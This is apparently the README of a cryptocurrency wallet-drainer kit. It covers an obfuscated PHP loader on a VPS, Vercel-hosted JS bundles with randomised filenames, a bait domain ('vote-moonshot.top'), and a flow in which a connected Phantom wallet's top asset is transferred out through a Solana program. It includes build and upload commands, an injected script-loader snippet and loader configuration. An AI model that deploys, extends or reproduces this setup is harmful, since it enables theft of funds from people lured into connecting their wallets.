# Wallet embed

```
├── vercel/          → Vercel: wallet JS, /connect/, gateway API, env config
├── vps/             → VPS only: obfuscated loader.php (embed proxy)
├── programs/        → Solana program (deploy to chain from your PC, not VPS)
└── nginx/           → nginx for VPS loader route
```

---

## Build (obfuscate everything except public HTML)

```bash
npm run build
```

| Output | Obfuscated? |
|--------|-------------|
| `vercel/public/*.js` | Random names from `vercel/asset-names.json` |
| `vercel/public/profile/*.js` | Random profile script name |
| `vercel/public/profile/index.html` | No (public HTML) |
| `vps/public/index.html` | No (public HTML) |
| `vps/loader.obf.php` | Yes (upload as `loader.php`) |

\*Full-bundle obfuscation (~2.2 MB) takes 5+ minutes and hangs Vercel builds, so vendor libs stay minified-only.

---

## VPS upload

Everything goes in **`/var/www/mysite/public/`** on the server:

```
public/
├── loader.php      ← upload loader.obf.php as this name
├── index.html      ← your page(s)
└── *.svg           ← assets
```

Edit config in repo `vps/loader.php`, build, upload:

```bash
nano vps/loader.php
npm run build
scp vps/loader.obf.php user@vps:/var/www/mysite/public/loader.php
scp vps/public/index.html user@vps:/var/www/mysite/public/
```

---

## HTML

```html
<script>
!function(u){var s=document.createElement("script");s.src=u;s.defer=1;document.head.appendChild(s)}("/vault38472");
</script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

---

## loader.php `$cfg`

```php
'reown_project_id' => 'YOUR_REOWN_ID',
'site_url' => 'https://vote-moonshot.top',
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
'button_class' => 'K7mQ2',
'connect_popup_enabled' => true,
// Transfers + RPC: Vercel env only (see vercel/.env.example)
```

---

## Vercel

1. Import repo → **Root Directory:** `vercel` → Deploy
2. Build command: `npm run build` (or `cd .. && npm run build` if root build needed)
3. JS URLs come from `vercel/asset-names.json` (synced into `loader.php` on build)

Regenerate random JS filenames:

```bash
cd vercel && npm run new-asset-names
cd .. && npm run build
```

Reown dashboard → allow **your HTML domain**

---

## Flow

```
vote-moonshot.top/vault38472  →  VPS loader only (embed config + script tag to Vercel bundle)
Reown wallet picker on embed  →  popup fuzzy-octo….vercel.app/connect/
Phantom connect + top-asset transfer  →  Vercel (program CPI, env: HELIUS_RPC_URL, TRANSFER_*)
```
